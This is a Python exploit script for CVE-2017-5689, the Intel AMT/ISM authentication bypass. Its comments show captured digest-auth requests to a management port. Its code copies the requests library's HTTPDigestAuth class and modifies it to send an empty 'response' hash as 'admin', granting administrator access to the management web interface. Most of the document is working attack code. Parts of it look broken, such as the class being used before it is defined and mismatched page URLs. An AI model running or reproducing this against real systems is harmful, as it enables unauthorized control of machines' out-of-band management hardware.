#!/usr/bin/python3
################################################################################
# This is a tool to persist an Intel IME admin session by modifying the GET 
# request to have the "response:" field empty in every request. 
# The web portal presented by the HARDWARE uses an MD5 in the response body to
# authenticate and per the link given, can be bypassed by simply emptying it.
# https://www.ssh.com/vulnerability/intel-amt/
# 
# CVE-2017-5689
#   https://nvd.nist.gov/vuln/detail/CVE-2017-5689
#   
#   An unprivileged network attacker could gain system privileges to 
#   provisioned Intel manageability SKUs: Intel Active Management Technology 
#   (AMT) and Intel Standard Manageability (ISM). An unprivileged local attacker
#   could provision manageability features gaining unprivileged network or local
#   system privileges on Intel manageability SKUs: Intel Active Management 
#   Technology (AMT), Intel Standard Manageability (ISM), and Intel Small 
#   Business Technology (SBT).
# 
################################################################################
# FIRST REQUEST:
################################################################################
# GET /index.htm HTTP/1.1
# Host: 192.168.0.44:16992
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 
#   Firefox/73.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,
#   */*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Connection: close
# Referer: http://192.168.0.44:16992/logon.htm
# Upgrade-Insecure-Requests: 1

################################################################################
# SECOND REQUEST
################################################################################
# GET /index.htm HTTP/1.1
# Host: 192.168.0.44:16992
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101
#   Firefox/73.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,
#   */*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Connection: close
# Referer: http://192.168.0.44:16992/logon.htm
# Upgrade-Insecure-Requests: 1
# Authorization: Digest username="admin", 
#       realm="Digest:72C40000000000000000000000000000", 
#       nonce="WT7ZAQsLAABEyoVgz4/+bFmvwKIRUvUI", 
#       uri="/index.htm", 
#       response="9621f86ecc7d8f680213ddc2aae3f21d", 
#       qop=auth, 
#       nc=00000001, 
#       cnonce="96d5787909ac7ea7"
################################################################################
# WE MODIFY 'response=""' TO BE EMPTY WITH THE USERNAME "ADMIN" THAT IS ALL
################################################################################


import os
import argparse
import requests
import selenium.webdriver as driver
from seleniumrequests import Firefox as foxy
from selenium.webdriver.firefox.options import Options

########################################
# Stuff for overwriting the digest class
########################################
import re
import time
import hashlib
import warnings
import selenium
import threading

from base64 import b64encode
from requests.compat import urlparse, str, basestring
from requests.cookies import extract_cookies_to_jar
from requests._internal_utils import to_native_string
from requests.utils import parse_dict_header

CONTENT_TYPE_FORM_URLENCODED = 'application/x-www-form-urlencoded'
CONTENT_TYPE_MULTI_PART = 'multipart/form-data'

#OPTIONS!
parser = argparse.ArgumentParser(description='Intel IME Admin Bypass Tool, CVE-2017-5689')
parser.add_argument('--target',
                                 dest    = 'target',
                                 action  = "store" ,
                                 default = "192.168.0.44" ,
                                 help    = "Intel IME Server To Target (http://192.168.0.1)" )
parser.add_argument('--port',
                                 dest    = 'port',
                                 action  = "store" ,
                                 default = '16992' ,
                                 help    = "Port for the IME Web UI (numbers only please)" )
parser.add_argument('--browser',
                                 dest    = 'which_browser',
                                 action  = "store" ,
                                 default = 'firefox' ,
                                 help    = "Browser to use (firefox, chrome)" )

arguments = parser.parse_args()

#########################################
# Stuff for the hack
#########################################
url                 = "http://" + arguments.target + ":" + arguments.port
ime_server_index    = url + "/index.html"
ime_server_logon    = url + "/logon.html"
options             = Options()
browser             = foxy(firefox_options=options)
useragent           = {'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0'}
session             = browser.request_session
#make it seem like we are being sent directly from the logon with every request
#hacked_headers = { "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
#                    "Accept-Language": "en-US,en;q=0.5",
#                    "Accept-Encoding": "gzip, deflate",
#                    "Connection": "close",
#                    "Referer": ime_server_logon,
#                    "Upgrade-Insecure-Requests":"1",                   
#                    "Authorization" : {"Digest username":"admin", 
#                    "realm":"Digest:72C40000000000000000000000000000", 
#                    "nonce":"YfAEBQ0NAAAxAnaU61uzWVtGD3AljIL2", 
#                    "uri": page_request, 
#                    "response":"",
#                    "qop":"auth" ,
#                    "nc":"00000001" , 
#                    "cnonce":"37ecc61ccd85a088"}}

# step one:
# modify a python library to hack things

# step two:
#begin authentication
index = requests.get(url, auth=HTTPDigestAuth('admin', 'Does_it_really_matter'))
#the response SHOULD be the index_page


class AuthBase(object):
    """Base class that all auth implementations derive from"""

    def __call__(self, r):
        raise NotImplementedError('Auth hooks must be callable.')

class HTTPDigestAuth(AuthBase):
    """Attaches HTTP Digest Authentication to the given Request object."""

    def __init__(self, username, password, desired_hash_response = None):
        self.username = username
        self.password = password
        ##############################
        #INSERT HACK
        self.desired_hash_response = desired_hash_response
        ##############################
        # Keep state in per-thread local storage
        self._thread_local = threading.local()

    def init_per_thread_state(self):
        # Ensure state is initialized just once per-thread
        if not hasattr(self._thread_local, 'init'):
            self._thread_local.init = True
            self._thread_local.last_nonce = ''
            self._thread_local.nonce_count = 0
            self._thread_local.chal = {}
            self._thread_local.pos = None
            self._thread_local.num_401_calls = None

    def build_digest_header(self, method, url):
        """
        :rtype: str
        """

        realm = self._thread_local.chal['realm']
        nonce = self._thread_local.chal['nonce']
        qop = self._thread_local.chal.get('qop')
        algorithm = self._thread_local.chal.get('algorithm')
        opaque = self._thread_local.chal.get('opaque')
        hash_utf8 = None

        if algorithm is None:
            _algorithm = 'MD5'
        else:
            _algorithm = algorithm.upper()
        # lambdas assume digest modules are imported at the top level
        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':
            def md5_utf8(x):
                if isinstance(x, str):
                    x = x.encode('utf-8')
                return hashlib.md5(x).hexdigest()
            hash_utf8 = md5_utf8
        elif _algorithm == 'SHA':
            def sha_utf8(x):
                if isinstance(x, str):
                    x = x.encode('utf-8')
                return hashlib.sha1(x).hexdigest()
            hash_utf8 = sha_utf8
        elif _algorithm == 'SHA-256':
            def sha256_utf8(x):
                if isinstance(x, str):
                    x = x.encode('utf-8')
                return hashlib.sha256(x).hexdigest()
            hash_utf8 = sha256_utf8
        elif _algorithm == 'SHA-512':
            def sha512_utf8(x):
                if isinstance(x, str):
                    x = x.encode('utf-8')
                return hashlib.sha512(x).hexdigest()
            hash_utf8 = sha512_utf8

        KD = lambda s, d: hash_utf8("%s:%s" % (s, d))

        if hash_utf8 is None:
            return None

        # XXX not implemented yet
        entdig = None
        p_parsed = urlparse(url)
        #: path is request-uri defined in RFC 2616 which should not be empty
        path = p_parsed.path or "/"
        if p_parsed.query:
            path += '?' + p_parsed.query

        A1 = '%s:%s:%s' % (self.username, realm, self.password)
        A2 = '%s:%s' % (method, path)

        HA1 = hash_utf8(A1)
        HA2 = hash_utf8(A2)

        if nonce == self._thread_local.last_nonce:
            self._thread_local.nonce_count += 1
        else:
            self._thread_local.nonce_count = 1
        ncvalue = '%08x' % self._thread_local.nonce_count
        s = str(self._thread_local.nonce_count).encode('utf-8')
        s += nonce.encode('utf-8')
        s += time.ctime().encode('utf-8')
        s += os.urandom(8)

        cnonce = (hashlib.sha1(s).hexdigest()[:16])
        if _algorithm == 'MD5-SESS':
            HA1 = hash_utf8('%s:%s:%s' % (HA1, nonce, cnonce))

        if not qop:
            respdig = KD(HA1, "%s:%s" % (nonce, HA2))
        elif qop == 'auth' or 'auth' in qop.split(','):
            noncebit = "%s:%s:%s:%s:%s" % (
                nonce, ncvalue, cnonce, 'auth', HA2
            )
            respdig = KD(HA1, noncebit)
        else:
            # XXX handle auth-int.
            return None

        self._thread_local.last_nonce = nonce

        # XXX should the partial digests be encoded too?
        ##############################
        #INSERT HACK
        if self.desired_hash_response == None:
            respdig = ""
        #############################
            base = 'username="%s", realm="%s", nonce="%s", uri="%s", ' \
                   'response="%s"' % (self.username, realm, nonce, path, respdig)
            if opaque:
                base += ', opaque="%s"' % opaque
            if algorithm:
                base += ', algorithm="%s"' % algorithm
            if entdig:
                base += ', digest="%s"' % entdig
            if qop:
                base += ', qop="auth", nc=%s, cnonce="%s"' % (ncvalue, cnonce)
        else:
            base = 'username="%s", realm="%s", nonce="%s", uri="%s", ' \
                   'response="%s"' % (self.username, realm, nonce, path, respdig)
            if opaque:
                base += ', opaque="%s"' % opaque
            if algorithm:
                base += ', algorithm="%s"' % algorithm
            if entdig:
                base += ', digest="%s"' % entdig
            if qop:
                base += ', qop="auth", nc=%s, cnonce="%s"' % (ncvalue, cnonce)
        #######################################
        # STOP HACKING
        #######################################
        return 'Digest %s' % (base)

    def handle_redirect(self, r, **kwargs):
        """Reset num_401_calls counter on redirects."""
        if r.is_redirect:
            self._thread_local.num_401_calls = 1

    def handle_401(self, r, **kwargs):
        """
        Takes the given response and tries digest-auth, if needed.

        :rtype: requests.Response
        """

        # If response is not 4xx, do not auth
        # See https://github.com/psf/requests/issues/3772
        if not 400 <= r.status_code < 500:
            self._thread_local.num_401_calls = 1
            return r

        if self._thread_local.pos is not None:
            # Rewind the file position indicator of the body to where
            # it was to resend the request.
            r.request.body.seek(self._thread_local.pos)
        s_auth = r.headers.get('www-authenticate', '')

        if 'digest' in s_auth.lower() and self._thread_local.num_401_calls < 2:

            self._thread_local.num_401_calls += 1
            pat = re.compile(r'digest ', flags=re.IGNORECASE)
            self._thread_local.chal = parse_dict_header(pat.sub('', s_auth, count=1))

            # Consume content and release the original connection
            # to allow our new request to reuse the same one.
            r.content
            r.close()
            prep = r.request.copy()
            extract_cookies_to_jar(prep._cookies, r.request, r.raw)
            prep.prepare_cookies(prep._cookies)

            prep.headers['Authorization'] = self.build_digest_header(
                prep.method, prep.url)
            _r = r.connection.send(prep, **kwargs)
            _r.history.append(r)
            _r.request = prep

            return _r

        self._thread_local.num_401_calls = 1
        return r

    def __call__(self, r):
        # Initialize per-thread state, if needed
        self.init_per_thread_state()
        # If we have a saved nonce, skip the 401
        if self._thread_local.last_nonce:
            r.headers['Authorization'] = self.build_digest_header(r.method, r.url)
        try:
            self._thread_local.pos = r.body.tell()
        except AttributeError:
            # In the case of HTTPDigestAuth being reused and the body of
            # the previous request was a file-like object, pos has the
            # file position of the previous body. Ensure it's set to
            # None.
            self._thread_local.pos = None
        r.register_hook('response', self.handle_401)
        r.register_hook('response', self.handle_redirect)
        self._thread_local.num_401_calls = 1

        return r

    def __eq__(self, other):
        return all([
            self.username == getattr(other, 'username', None),
            self.password == getattr(other, 'password', None)
        ])

    def __ne__(self, other):
        return not self == other
